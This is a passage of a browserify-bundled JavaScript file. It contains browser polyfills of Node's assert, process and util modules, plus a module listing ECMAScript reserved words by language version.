        out = out.substring(next_line + 1);
      }

      this.stack = out;
    }
  }
};

// assert.AssertionError instanceof Error
util.inherits(assert.AssertionError, Error);

function truncate(s, n) {
  if (typeof s === 'string') {
    return s.length < n ? s : s.slice(0, n);
  } else {
    return s;
  }
}
function inspect(something) {
  if (functionsHaveNames || !util.isFunction(something)) {
    return util.inspect(something);
  }
  var rawname = getName(something);
  var name = rawname ? ': ' + rawname : '';
  return '[Function' +  name + ']';
}
function getMessage(self) {
  return truncate(inspect(self.actual), 128) + ' ' +
         self.operator + ' ' +
         truncate(inspect(self.expected), 128);
}

// At present only the three keys mentioned above are used and
// understood by the spec. Implementations or sub modules can pass
// other keys to the AssertionError's constructor - they will be
// ignored.

// 3. All of the following functions must throw an AssertionError
// when a corresponding condition is not met, with a message that
// may be undefined if not provided.  All assertion methods provide
// both the actual and expected values to the assertion error for
// display purposes.

function fail(actual, expected, message, operator, stackStartFunction) {
  throw new assert.AssertionError({
    message: message,
    actual: actual,
    expected: expected,
    operator: operator,
    stackStartFunction: stackStartFunction
  });
}

// EXTENSION! allows for well behaved errors defined elsewhere.
assert.fail = fail;

// 4. Pure assertion tests whether a value is truthy, as determined
// by !!guard.
// assert.ok(guard, message_opt);
// This statement is equivalent to assert.equal(true, !!guard,
// message_opt);. To test strictly for the value true, use
// assert.strictEqual(true, guard, message_opt);.

function ok(value, message) {
  if (!value) fail(value, true, message, '==', assert.ok);
}
assert.ok = ok;

// 5. The equality assertion tests shallow, coercive equality with
// ==.
// assert.equal(actual, expected, message_opt);

assert.equal = function equal(actual, expected, message) {
  if (actual != expected) fail(actual, expected, message, '==', assert.equal);
};

// 6. The non-equality assertion tests for whether two objects are not equal
// with != assert.notEqual(actual, expected, message_opt);

assert.notEqual = function notEqual(actual, expected, message) {
  if (actual == expected) {
    fail(actual, expected, message, '!=', assert.notEqual);
  }
};

// 7. The equivalence assertion tests a deep equality relation.
// assert.deepEqual(actual, expected, message_opt);

assert.deepEqual = function deepEqual(actual, expected, message) {
  if (!_deepEqual(actual, expected, false)) {
    fail(actual, expected, message, 'deepEqual', assert.deepEqual);
  }
};

assert.deepStrictEqual = function deepStrictEqual(actual, expected, message) {
  if (!_deepEqual(actual, expected, true)) {
    fail(actual, expected, message, 'deepStrictEqual', assert.deepStrictEqual);
  }
};

function _deepEqual(actual, expected, strict, memos) {
  // 7.1. All identical values are equivalent, as determined by ===.
  if (actual === expected) {
    return true;
  } else if (isBuffer(actual) && isBuffer(expected)) {
    return compare(actual, expected) === 0;

  // 7.2. If the expected value is a Date object, the actual value is
  // equivalent if it is also a Date object that refers to the same time.
  } else if (util.isDate(actual) && util.isDate(expected)) {
    return actual.getTime() === expected.getTime();

  // 7.3 If the expected value is a RegExp object, the actual value is
  // equivalent if it is also a RegExp object with the same source and
  // properties (`global`, `multiline`, `lastIndex`, `ignoreCase`).
  } else if (util.isRegExp(actual) && util.isRegExp(expected)) {
    return actual.source === expected.source &&
           actual.global === expected.global &&
           actual.multiline === expected.multiline &&
           actual.lastIndex === expected.lastIndex &&
           actual.ignoreCase === expected.ignoreCase;

  // 7.4. Other pairs that do not both pass typeof value == 'object',
  // equivalence is determined by ==.
  } else if ((actual === null || typeof actual !== 'object') &&
             (expected === null || typeof expected !== 'object')) {
    return strict ? actual === expected : actual == expected;

  // If both values are instances of typed arrays, wrap their underlying
  // ArrayBuffers in a Buffer each to increase performance
  // This optimization requires the arrays to have the same type as checked by
  // Object.prototype.toString (aka pToString). Never perform binary
  // comparisons for Float*Arrays, though, since e.g. +0 === -0 but their
  // bit patterns are not identical.
  } else if (isView(actual) && isView(expected) &&
             pToString(actual) === pToString(expected) &&
             !(actual instanceof Float32Array ||
               actual instanceof Float64Array)) {
    return compare(new Uint8Array(actual.buffer),
                   new Uint8Array(expected.buffer)) === 0;

  // 7.5 For all other Object pairs, including Array objects, equivalence is
  // determined by having the same number of owned properties (as verified
  // with Object.prototype.hasOwnProperty.call), the same set of keys
  // (although not necessarily the same order), equivalent values for every
  // corresponding key, and an identical 'prototype' property. Note: this
  // accounts for both named and indexed properties on Arrays.
  } else if (isBuffer(actual) !== isBuffer(expected)) {
    return false;
  } else {
    memos = memos || {actual: [], expected: []};

    var actualIndex = memos.actual.indexOf(actual);
    if (actualIndex !== -1) {
      if (actualIndex === memos.expected.indexOf(expected)) {
        return true;
      }
    }

    memos.actual.push(actual);
    memos.expected.push(expected);

    return objEquiv(actual, expected, strict, memos);
  }
}

function isArguments(object) {
  return Object.prototype.toString.call(object) == '[object Arguments]';
}

function objEquiv(a, b, strict, actualVisitedObjects) {
  if (a === null || a === undefined || b === null || b === undefined)
    return false;
  // if one is a primitive, the other must be same
  if (util.isPrimitive(a) || util.isPrimitive(b))
    return a === b;
  if (strict && Object.getPrototypeOf(a) !== Object.getPrototypeOf(b))
    return false;
  var aIsArgs = isArguments(a);
  var bIsArgs = isArguments(b);
  if ((aIsArgs && !bIsArgs) || (!aIsArgs && bIsArgs))
    return false;
  if (aIsArgs) {
    a = pSlice.call(a);
    b = pSlice.call(b);
    return _deepEqual(a, b, strict);
  }
  var ka = objectKeys(a);
  var kb = objectKeys(b);
  var key, i;
  // having the same number of owned properties (keys incorporates
  // hasOwnProperty)
  if (ka.length !== kb.length)
    return false;
  //the same set of keys (although not necessarily the same order),
  ka.sort();
  kb.sort();
  //~~~cheap key test
  for (i = ka.length - 1; i >= 0; i--) {
    if (ka[i] !== kb[i])
      return false;
  }
  //equivalent values for every corresponding key, and
  //~~~possibly expensive deep test
  for (i = ka.length - 1; i >= 0; i--) {
    key = ka[i];
    if (!_deepEqual(a[key], b[key], strict, actualVisitedObjects))
      return false;
  }
  return true;
}

// 8. The non-equivalence assertion tests for any deep inequality.
// assert.notDeepEqual(actual, expected, message_opt);

assert.notDeepEqual = function notDeepEqual(actual, expected, message) {
  if (_deepEqual(actual, expected, false)) {
    fail(actual, expected, message, 'notDeepEqual', assert.notDeepEqual);
  }
};

assert.notDeepStrictEqual = notDeepStrictEqual;
function notDeepStrictEqual(actual, expected, message) {
  if (_deepEqual(actual, expected, true)) {
    fail(actual, expected, message, 'notDeepStrictEqual', notDeepStrictEqual);
  }
}


// 9. The strict equality assertion tests strict equality, as determined by ===.
// assert.strictEqual(actual, expected, message_opt);

assert.strictEqual = function strictEqual(actual, expected, message) {
  if (actual !== expected) {
    fail(actual, expected, message, '===', assert.strictEqual);
  }
};

// 10. The strict non-equality assertion tests for strict inequality, as
// determined by !==.  assert.notStrictEqual(actual, expected, message_opt);

assert.notStrictEqual = function notStrictEqual(actual, expected, message) {
  if (actual === expected) {
    fail(actual, expected, message, '!==', assert.notStrictEqual);
  }
};

function expectedException(actual, expected) {
  if (!actual || !expected) {
    return false;
  }

  if (Object.prototype.toString.call(expected) == '[object RegExp]') {
    return expected.test(actual);
  }

  try {
    if (actual instanceof expected) {
      return true;
    }
  } catch (e) {
    // Ignore.  The instanceof check doesn't work for arrow functions.
  }

  if (Error.isPrototypeOf(expected)) {
    return false;
  }

  return expected.call({}, actual) === true;
}

function _tryBlock(block) {
  var error;
  try {
    block();
  } catch (e) {
    error = e;
  }
  return error;
}

function _throws(shouldThrow, block, expected, message) {
  var actual;

  if (typeof block !== 'function') {
    throw new TypeError('"block" argument must be a function');
  }

  if (typeof expected === 'string') {
    message = expected;
    expected = null;
  }

  actual = _tryBlock(block);

  message = (expected && expected.name ? ' (' + expected.name + ').' : '.') +
            (message ? ' ' + message : '.');

  if (shouldThrow && !actual) {
    fail(actual, expected, 'Missing expected exception' + message);
  }

  var userProvidedMessage = typeof message === 'string';
  var isUnwantedException = !shouldThrow && util.isError(actual);
  var isUnexpectedException = !shouldThrow && actual && !expected;

  if ((isUnwantedException &&
      userProvidedMessage &&
      expectedException(actual, expected)) ||
      isUnexpectedException) {
    fail(actual, expected, 'Got unwanted exception' + message);
  }

  if ((shouldThrow && actual && expected &&
      !expectedException(actual, expected)) || (!shouldThrow && actual)) {
    throw actual;
  }
}

// 11. Expected to throw an error:
// assert.throws(block, Error_opt, message_opt);

assert.throws = function(block, /*optional*/error, /*optional*/message) {
  _throws(true, block, error, message);
};

// EXTENSION! This is annoying to write outside this module.
assert.doesNotThrow = function(block, /*optional*/error, /*optional*/message) {
  _throws(false, block, error, message);
};

assert.ifError = function(err) { if (err) throw err; };

var objectKeys = Object.keys || function (obj) {
  var keys = [];
  for (var key in obj) {
    if (hasOwn.call(obj, key)) keys.push(key);
  }
  return keys;
};

}).call(this,typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : {})

},{"util/":22}],17:[function(require,module,exports){
// shim for using process in browser
var process = module.exports = {};

// cached from whatever global is present so that test runners that stub it
// don't break things.  But we need to wrap it in a try catch in case it is
// wrapped in strict mode code which doesn't define any globals.  It's inside a
// function because try/catches deoptimize in certain engines.

var cachedSetTimeout;
var cachedClearTimeout;

function defaultSetTimout() {
    throw new Error('setTimeout has not been defined');
}
function defaultClearTimeout () {
    throw new Error('clearTimeout has not been defined');
}
(function () {
    try {
        if (typeof setTimeout === 'function') {
            cachedSetTimeout = setTimeout;
        } else {
            cachedSetTimeout = defaultSetTimout;
        }
    } catch (e) {
        cachedSetTimeout = defaultSetTimout;
    }
    try {
        if (typeof clearTimeout === 'function') {
            cachedClearTimeout = clearTimeout;
        } else {
            cachedClearTimeout = defaultClearTimeout;
        }
    } catch (e) {
        cachedClearTimeout = defaultClearTimeout;
    }
} ())
function runTimeout(fun) {
    if (cachedSetTimeout === setTimeout) {
        //normal enviroments in sane situations
        return setTimeout(fun, 0);
    }
    // if setTimeout wasn't available but was latter defined
    if ((cachedSetTimeout === defaultSetTimout || !cachedSetTimeout) && setTimeout) {
        cachedSetTimeout = setTimeout;
        return setTimeout(fun, 0);
    }
    try {
        // when when somebody has screwed with setTimeout but no I.E. maddness
        return cachedSetTimeout(fun, 0);
    } catch(e){
        try {
            // When we are in I.E. but the script has been evaled so I.E. doesn't trust the global object when called normally
            return cachedSetTimeout.call(null, fun, 0);
        } catch(e){
            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error
            return cachedSetTimeout.call(this, fun, 0);
        }
    }


}
function runClearTimeout(marker) {
    if (cachedClearTimeout === clearTimeout) {
        //normal enviroments in sane situations
        return clearTimeout(marker);
    }
    // if clearTimeout wasn't available but was latter defined
    if ((cachedClearTimeout === defaultClearTimeout || !cachedClearTimeout) && clearTimeout) {
        cachedClearTimeout = clearTimeout;
        return clearTimeout(marker);
    }
    try {
        // when when somebody has screwed with setTimeout but no I.E. maddness
        return cachedClearTimeout(marker);
    } catch (e){
        try {
            // When we are in I.E. but the script has been evaled so I.E. doesn't  trust the global object when called normally
            return cachedClearTimeout.call(null, marker);
        } catch (e){
            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error.
            // Some versions of I.E. have different rules for clearTimeout vs setTimeout
            return cachedClearTimeout.call(this, marker);
        }
    }



}
var queue = [];
var draining = false;
var currentQueue;
var queueIndex = -1;

function cleanUpNextTick() {
    if (!draining || !currentQueue) {
        return;
    }
    draining = false;
    if (currentQueue.length) {
        queue = currentQueue.concat(queue);
    } else {
        queueIndex = -1;
    }
    if (queue.length) {
        drainQueue();
    }
}

function drainQueue() {
    if (draining) {
        return;
    }
    var timeout = runTimeout(cleanUpNextTick);
    draining = true;

    var len = queue.length;
    while(len) {
        currentQueue = queue;
        queue = [];
        while (++queueIndex < len) {
            if (currentQueue) {
                currentQueue[queueIndex].run();
            }
        }
        queueIndex = -1;
        len = queue.length;
    }
    currentQueue = null;
    draining = false;
    runClearTimeout(timeout);
}

process.nextTick = function (fun) {
    var args = new Array(arguments.length - 1);
    if (arguments.length > 1) {
        for (var i = 1; i < arguments.length; i++) {
            args[i - 1] = arguments[i];
        }
    }
    queue.push(new Item(fun, args));
    if (queue.length === 1 && !draining) {
        runTimeout(drainQueue);
    }
};

// v8 likes predictible objects
function Item(fun, array) {
    this.fun = fun;
    this.array = array;
}
Item.prototype.run = function () {
    this.fun.apply(null, this.array);
};
process.title = 'browser';
process.browser = true;
process.env = {};
process.argv = [];
process.version = ''; // empty string to avoid regexp issues
process.versions = {};

function noop() {}

process.on = noop;
process.addListener = noop;
process.once = noop;
process.off = noop;
process.removeListener = noop;
process.removeAllListeners = noop;
process.emit = noop;
process.prependListener = noop;
process.prependOnceListener = noop;

process.listeners = function (name) { return [] }

process.binding = function (name) {
    throw new Error('process.binding is not supported');
};

process.cwd = function () { return '/' };
process.chdir = function (dir) {
    throw new Error('process.chdir is not supported');
};
process.umask = function() { return 0; };

},{}],18:[function(require,module,exports){
module.exports = require('./reserved-words');

},{"./reserved-words":19}],19:[function(require,module,exports){
var assert = require('assert');

/**
 * Structure for storing keywords.
 *
 * @typedef {Object.<String,Boolean>} KeywordsHash
 */

/**
 * ECMAScript dialects.
 *
 * @const
 * @type {Object.<String,Number|String>} - keys as readable names and values as versions
 */
var DIALECTS = {
    es3: 3,
    es5: 5,
    es2015: 6,
    es7: 7,

    // aliases
    es6: 6,
    'default': 5,
    next: 6
};

/**
 * ECMAScript reserved words.
 *
 * @type {Object.<String,KeywordsHash>}
 */
var KEYWORDS = exports.KEYWORDS = {};

/**
 * Check word for being an reserved word.
 *
 * @param {String} word - word to check
 * @param {String|Number} [dialect] - dialect or version
 * @param {Boolean} [strict] - strict mode
 * @returns {?Boolean}
 */
exports.check = function check(word, dialect, strict) {
    dialect = dialect || DIALECTS.default;
    var version = DIALECTS[dialect] || dialect;

    if (strict && version >= 5) {
        version += '-strict';
    }

    assert(KEYWORDS[version], 'Unknown dialect');

    return KEYWORDS[version].hasOwnProperty(word);
};

/**
 * Reserved Words for ES3
 *
 * ECMA-262 3rd: 7.5.1
 * http://www.ecma-international.org/publications/files/ECMA-ST-ARCH/ECMA-262,%203rd%20edition,%20December%201999.pdf
 *
 * @type {KeywordsHash}
 */
KEYWORDS['3'] = _hash(
    // Keyword, ECMA-262 3rd: 7.5.2
    'break    else       new     var',
    'case     finally    return  void',
    'catch    for        switch  while',
    'continue function   this    with',
    'default  if         throw',
    'delete   in         try',
    'do       instanceof typeof',
    // FutureReservedWord, ECMA-262 3rd 7.5.3
    'abstract enum       int        short',
    'boolean  export     interface  static',
    'byte     extends    long       super',
    'char     final      native     synchronized',
    'class    float      package    throws',
    'const    goto       private    transient',
    'debugger implements protected  volatile',
    'double   import     public',
    // NullLiteral & BooleanLiteral
    'null true false'
);

/**
 * Reserved Words for ES5.
 *
 * http://es5.github.io/#x7.6.1
 *
 * @type {KeywordsHash}
 */
KEYWORDS['5'] = _hash(
    // Keyword
    'break    do       instanceof typeof',
    'case     else     new        var',
    'catch    finally  return     void',
    'continue for      switch     while',
    'debugger function this       with',
    'default  if       throw',
    'delete   in       try',
    // FutureReservedWord
    'class enum extends super',
    'const export import',
    // NullLiteral & BooleanLiteral
    'null true false'
);

/**
 * Reserved Words for ES5 in strict mode.
 *
 * @type {KeywordsHash}
 */
KEYWORDS['5-strict'] = _hash(
    KEYWORDS['5'],
    // FutureReservedWord, strict mode. http://es5.github.io/#x7.6.1.2
    'implements let     private   public yield',
    'interface  package protected static'
);

/**
 * Reserved Words for ES6.
 *
 * 11.6.2
 * http://www.ecma-international.org/ecma-262/6.0/index.html#sec-reserved-words
 *
 * @type {KeywordsHash}
 */
KEYWORDS['6'] = _hash(
    // Keywords, ES6 11.6.2.1, http://www.ecma-international.org/ecma-262/6.0/index.html#sec-keywords
    'break    do       in         typeof',
    'case     else     instanceof var',
    'catch    export   new        void',
    'class    extends  return     while',
    'const    finally  super      with',
    'continue for      switch     yield',
    'debugger function this',
    'default  if       throw',
    'delete   import   try',
    // Future Reserved Words, ES6 11.6.2.2
    // http://www.ecma-international.org/ecma-262/6.0/index.html#sec-future-reserved-words
    'enum await',
    // NullLiteral & BooleanLiteral
    'null true false'
);

/**
 * Reserved Words for ES6 in strict mode.
 *
 * @type {KeywordsHash}
 */
KEYWORDS['6-strict'] = _hash(
    KEYWORDS['6'],
    // Keywords, ES6 11.6.2.1
    'let static',
    // Future Reserved Words, ES6 11.6.2.2
    'implements package protected',
    'interface private public'
);

/**
 * Generates hash from strings
 *
 * @private
 * @param {...String|KeywordsHash} keywords - Space-delimited string or previous result of _hash
 * @return {KeywordsHash} - Object with keywords in keys and true in values
 */
function _hash() {
    var set = Array.prototype.map.call(arguments, function(v) {
        return typeof v === 'string' ? v : Object.keys(v).join(' ');
    }).join(' ');

    return set.split(/\s+/)
        .reduce(function(res, keyword) {
            res[keyword] = true;
            return res;
        }, {});
}

},{"assert":16}],20:[function(require,module,exports){
if (typeof Object.create === 'function') {
  // implementation from standard node.js 'util' module
  module.exports = function inherits(ctor, superCtor) {
    ctor.super_ = superCtor
    ctor.prototype = Object.create(superCtor.prototype, {
      constructor: {
        value: ctor,
        enumerable: false,
        writable: true,
        configurable: true
      }
    });
  };
} else {
  // old school shim for old browsers
  module.exports = function inherits(ctor, superCtor) {
    ctor.super_ = superCtor
    var TempCtor = function () {}
    TempCtor.prototype = superCtor.prototype
    ctor.prototype = new TempCtor()
    ctor.prototype.constructor = ctor
  }
}

},{}],21:[function(require,module,exports){
module.exports = function isBuffer(arg) {
  return arg && typeof arg === 'object'
    && typeof arg.copy === 'function'
    && typeof arg.fill === 'function'
    && typeof arg.readUInt8 === 'function';
}
},{}],22:[function(require,module,exports){
(function (process,global){
// Copyright Joyent, Inc. and other Node contributors.
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the
// "Software"), to deal in the Software without restriction, including
// without limitation the rights to use, copy, modify, merge, publish,
// distribute, sublicense, and/or sell copies of the Software, and to permit
// persons to whom the Software is furnished to do so, subject to the
// following conditions:
//
// The above copyright notice and this permission notice shall be included
// in all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
// OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN
// NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
// DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
// OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE
// USE OR OTHER DEALINGS IN THE SOFTWARE.

var formatRegExp = /%[sdj%]/g;
exports.format = function(f) {
  if (!isString(f)) {
    var objects = [];
    for (var i = 0; i < arguments.length; i++) {
      objects.push(inspect(arguments[i]));
    }
    return objects.join(' ');
  }

  var i = 1;
  var args = arguments;
  var len = args.length;
  var str = String(f).replace(formatRegExp, function(x) {
    if (x === '%%') return '%';
    if (i >= len) return x;
    switch (x) {
      case '%s': return String(args[i++]);
      case '%d': return Number(args[i++]);
      case '%j':
        try {
          return JSON.stringify(args[i++]);
        } catch (_) {
          return '[Circular]';
        }
      default:
        return x;
    }
  });
  for (var x = args[i]; i < len; x = args[++i]) {
    if (isNull(x) || !isObject(x)) {
      str += ' ' + x;
    } else {
      str += ' ' + inspect(x);
    }
  }
  return str;
};


// Mark that a method should not be used.
// Returns a modified function which warns once by default.
// If --no-deprecation is set, then it is a no-op.
exports.deprecate = function(fn, msg) {
  // Allow for deprecating things in the process of starting up.
  if (isUndefined(global.process)) {
    return function() {
      return exports.deprecate(fn, msg).apply(this, arguments);
    };
  }

  if (process.noDeprecation === true) {
    return fn;
  }

  var warned = false;
  function deprecated() {
    if (!warned) {
      if (process.throwDeprecation) {
        throw new Error(msg);
      } else if (process.traceDeprecation) {
        console.trace(msg);
      } else {
        console.error(msg);
      }
      warned = true;
    }
    return fn.apply(this, arguments);
  }

  return deprecated;
};


var debugs = {};
var debugEnviron;
exports.debuglog = function(set) {
  if (isUndefined(debugEnviron))
    debugEnviron = process.env.NODE_DEBUG || '';
  set = set.toUpperCase();
  if (!debugs[set]) {
    if (new RegExp('\\b' + set + '\\b', 'i').test(debugEnviron)) {
      var pid = process.pid;
      debugs[set] = function() {
        var msg = exports.format.apply(exports, arguments);
        console.error('%s %d: %s', set, pid, msg);
      };
    } else {
      debugs[set] = function() {};
    }
  }
  return debugs[set];
};


/**
 * Echos the value of a value. Trys to print the value out
 * in the best way possible given the different types.
 *
 * @param {Object} obj The object to print out.
 * @param {Object} opts Optional options object that alters the output.
 */
/* legacy: obj, showHidden, depth, colors*/
function inspect(obj, opts) {
  // default options
  var ctx = {
    seen: [],
    stylize: stylizeNoColor
  };
  // legacy...
  if (arguments.length >= 3) ctx.depth = arguments[2];
  if (arguments.length >= 4) ctx.colors = arguments[3];
  if (isBoolean(opts)) {
    // legacy...
    ctx.showHidden = opts;
  } else if (opts) {
    // got an "options" object
    exports._extend(ctx, opts);
  }
  // set default options
  if (isUndefined(ctx.showHidden)) ctx.showHidden = false;
  if (isUndefined(ctx.depth)) ctx.depth = 2;
  if (isUndefined(ctx.colors)) ctx.colors = false;
  if (isUndefined(ctx.customInspect)) ctx.customInspect = true;
  if (ctx.colors) ctx.stylize = stylizeWithColor;
  return formatValue(ctx, obj, ctx.depth);
}
exports.inspect = inspect;


// http://en.wikipedia.org/wiki/ANSI_escape_code#graphics
inspect.colors = {
  'bold' : [1, 22],
  'italic' : [3, 23],
  'underline' : [4, 24],
  'inverse' : [7, 27],
  'white' : [37, 39],
  'grey' : [90, 39],
  'black' : [30, 39],
  'blue' : [34, 39],
  'cyan' : [36, 39],
  'green' : [32, 39],
  'magenta' : [35, 39],
  'red' : [31, 39],
  'yellow' : [33, 39]
};

// Don't use 'blue' not visible on cmd.exe
inspect.styles = {
  'special': 'cyan',
  'number': 'yellow',
  'boolean': 'yellow',
  'undefined': 'grey',
  'null': 'bold',
  'string': 'green',
  'date': 'magenta',
  // "name": intentionally not styling
  'regexp': 'red'
};


function stylizeWithColor(str, styleType) {
  var style = inspect.styles[styleType];

  if (style) {
    return '\u001b[' + inspect.colors[style][0] + 'm' + str +
           '\u001b[' + inspect.colors[style][1] + 'm';
  } else {
    return str;
  }
}


function stylizeNoColor(str, styleType) {
  return str;
}


function arrayToHash(array) {
  var hash = {};

  array.forEach(function(val, idx) {
    hash[val] = true;
  });

  return hash;
}


function formatValue(ctx, value, recurseTimes) {
  // Provide a hook for user-specified inspect functions.
  // Check that value is an object with an inspect function on it
  if (ctx.customInspect &&
      value &&
      isFunction(value.inspect) &&
      // Filter out the util module, it's inspect function is special
      value.inspect !== exports.inspect &&
      // Also filter out any prototype objects using the circular check.
      !(value.constructor && value.constructor.prototype === value)) {
    var ret = value.inspect(recurseTimes, ctx);
    if (!isString(ret)) {
      ret = formatValue(ctx, ret, recurseTimes);
    }
    return ret;
  }

  // Primitive types cannot have properties
  var primitive = formatPrimitive(ctx, value);
  if (primitive) {
    return primitive;
  }

  // Look up the keys of the object.
  var keys = Object.keys(value);
  var visibleKeys = arrayToHash(keys);

  if (ctx.showHidden) {
    keys = Object.getOwnPropertyNames(value);
  }

  // IE doesn't make error fields non-enumerable
  // http://msdn.microsoft.com/en-us/library/ie/dww52sbt(v=vs.94).aspx
  if (isError(value)
      && (keys.indexOf('message') >= 0 || keys.indexOf('description') >= 0)) {
    return formatError(value);
  }

  // Some type of object without properties can be shortcutted.
  if (keys.length === 0) {
    if (isFunction(value)) {
      var name = value.name ? ': ' + value.name : '';
      return ctx.stylize('[Function' + name + ']', 'special');
    }
    if (isRegExp(value)) {
      return ctx.stylize(RegExp.prototype.toString.call(value), 'regexp');
    }
    if (isDate(value)) {
      return ctx.stylize(Date.prototype.toString.call(value), 'date');
    }
    if (isError(value)) {
      return formatError(value);
    }
  }

  var base = '', array = false, braces = ['{', '}'];

  // Make Array say that they are Array
  if (isArray(value)) {
    array = true;
    braces = ['[', ']'];
  }

  // Make functions say that they are functions
  if (isFunction(value)) {
    var n = value.name ? ': ' + value.name : '';
    base = ' [Function' + n + ']';
  }

  // Make RegExps say that they are RegExps
  if (isRegExp(value)) {
    base = ' ' + RegExp.prototype.toString.call(value);
  }

  // Make dates with properties first say the date
  if (isDate(value)) {
    base = ' ' + Date.prototype.toUTCString.call(value);
  }

  // Make error with message first say the error
  if (isError(value)) {
    base = ' ' + formatError(value);
  }

  if (keys.length === 0 && (!array || value.length == 0)) {
    return braces[0] + base + braces[1];
  }

  if (recurseTimes < 0) {
    if (isRegExp(value)) {
      return ctx.stylize(RegExp.prototype.toString.call(value), 'regexp');
    } else {
      return ctx.stylize('[Object]', 'special');
    }
  }

  ctx.seen.push(value);

  var output;
  if (array) {
    output = formatArray(ctx, value, recurseTimes, visibleKeys, keys);
  } else {
    output = keys.map(function(key) {
      return formatProperty(ctx, value, recurseTimes, visibleKeys, key, array);
    });
  }

  ctx.seen.pop();

  return reduceToSingleString(output, base, braces);
}


function formatPrimitive(ctx, value) {
  if (isUndefined(value))
    return ctx.stylize('undefined', 'undefined');
  if (isString(value)) {
    var simple = '\'' + JSON.stringify(value).replace(/^"|"$/g, '')
                                             .replace(/'/g, "\\'")
                                             .replace(/\\"/g, '"') + '\'';
    return ctx.stylize(simple, 'string');
  }
  if (isNumber(value))
    return ctx.stylize('' + value, 'number');
  if (isBoolean(value))
    return ctx.stylize('' + value, 'boolean');
  // For some reason typeof null is "object", so special case here.
  if (isNull(value))
    return ctx.stylize('null', 'null');
}


function formatError(value) {
  return '[' + Error.prototype.toString.call(value) + ']';
}


function formatArray(ctx, value, recurseTimes, visibleKeys, keys) {
  var output = [];
  for (var i = 0, l = value.length; i < l; ++i) {
    if (hasOwnProperty(value, String(i))) {
      output.push(formatProperty(ctx, value, recurseTimes, visibleKeys,
          String(i), true));
    } else {
      output.push('');
    }
  }
  keys.forEach(function(key) {
    if (!key.match(/^\d+$/)) {
      output.push(formatProperty(ctx, value, recurseTimes, visibleKeys,
          key, true));
    }
  });
  return output;
}


function formatProperty(ctx, value, recurseTimes, visibleKeys, key, array) {
  var name, str, desc;
  desc = Object.getOwnPropertyDescriptor(value, key) || { value: value[key] };
  if (desc.get) {
    if (desc.set) {
      str = ctx.stylize('[Getter/Setter]', 'special');
    } else {
      str = ctx.stylize('[Getter]', 'special');
    }
  } else {
    if (desc.set) {
      str = ctx.stylize('[Setter]', 'special');
    }
  }
  if (!hasOwnProperty(visibleKeys, key)) {
    name = '[' + key + ']';
  }
  if (!str) {
    if (ctx.seen.indexOf(desc.value) < 0) {
      if (isNull(recurseTimes)) {
        str = formatValue(ctx, desc.value, null);
      } else {
        str = formatValue(ctx, desc.value, recurseTimes - 1);
      }
      if (str.indexOf('\n') > -1) {
        if (array) {
          str = str.split('\n').map(function(line) {
            return '  ' + line;
          }).join('\n').substr(2);
        } else {
          str = '\n' + str.split('\n').map(function(line) {
            return '   ' + line;
          }).join('\n');
        }
      }
    } else {
      str = ctx.stylize('[Circular]', 'special');
    }
  }
  if (isUndefined(name)) {
    if (array && key.match(/^\d+$/)) {
      return str;
    }
    name = JSON.stringify('' + key);
    if (name.match(/^"([a-zA-Z_][a-zA-Z_0-9]*)"$/)) {
      name = name.substr(1, name.length - 2);
      name = ctx.stylize(name, 'name');
    } else {
      name = name.replace(/'/g, "\\'")
                 .replace(/\\"/g, '"')
                 .replace(/(^"|"$)/g, "'");
      name = ctx.stylize(name, 'string');
    }
  }

  return name + ': ' + str;
}


function reduceToSingleString(output, base, braces) {
  var numLinesEst = 0;
  var length = output.reduce(function(prev, cur) {
    numLinesEst++;
    if (cur.indexOf('\n') >= 0) numLinesEst++;
    return prev + cur.replace(/\u001b\[\d\d?m/g, '').length + 1;
  }, 0);

  if (length > 60) {
    return braces[0] +
           (base === '' ? '' : base + '\n ') +
           ' ' +
           output.join(',\n  ') +
           ' ' +
           braces[1];
  }

  return braces[0] + base + ' ' + output.join(', ') + ' ' + braces[1];
}


// NOTE: These type checking functions intentionally don't use `instanceof`
// because it is fragile and can be easily faked with `Object.create()`.
function isArray(ar) {
  return Array.isArray(ar);
}
exports.isArray = isArray;

function isBoolean(arg) {
  return typeof arg === 'boolean';
}
exports.isBoolean = isBoolean;

function isNull(arg) {
  return arg === null;
}
exports.isNull = isNull;

function isNullOrUndefined(arg) {
  return arg == null;
}
exports.isNullOrUndefined = isNullOrUndefined;

function isNumber(arg) {
  return typeof arg === 'number';
}
exports.isNumber = isNumber;

function isString(arg) {
  return typeof arg === 'string';
}
exports.isString = isString;

function isSymbol(arg) {
  return typeof arg === 'symbol';
}
exports.isSymbol = isSymbol;

function isUndefined(arg) {
  return arg === void 0;
}
exports.isUndefined = isUndefined;

function isRegExp(re) {
  return isObject(re) && objectToString(re) === '[object RegExp]';
}
exports.isRegExp = isRegExp;

function isObject(arg) {
  return typeof arg === 'object' && arg !== null;
}
exports.isObject = isObject;

function isDate(d) {
  return isObject(d) && objectToString(d) === '[object Date]';
}
exports.isDate = isDate;

function isError(e) {
  return isObject(e) &&
      (objectToString(e) === '[object Error]' || e instanceof Error);
}
exports.isError = isError;

function isFunction(arg) {
  return typeof arg === 'function';
}
exports.isFunction = isFunction;

function isPrimitive(arg) {
  return arg === null ||
         typeof arg === 'boolean' ||
         typeof arg === 'number' ||
         typeof arg === 'string' ||
         typeof arg === 'symbol' ||  // ES6 symbol
         typeof arg === 'undefined';
}
exports.isPrimitive = isPrimitive;

exports.isBuffer = require('./support/isBuffer');

function objectToString(o) {
  return Object.prototype.toString.call(o);
}


function pad(n) {
  return n < 10 ? '0' + n.toString(10) : n.toString(10);
}


var months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep',
              'Oct', 'Nov', 'Dec'];

// 26 Feb 16:19:34
function timestamp() {
  var d = new Date();
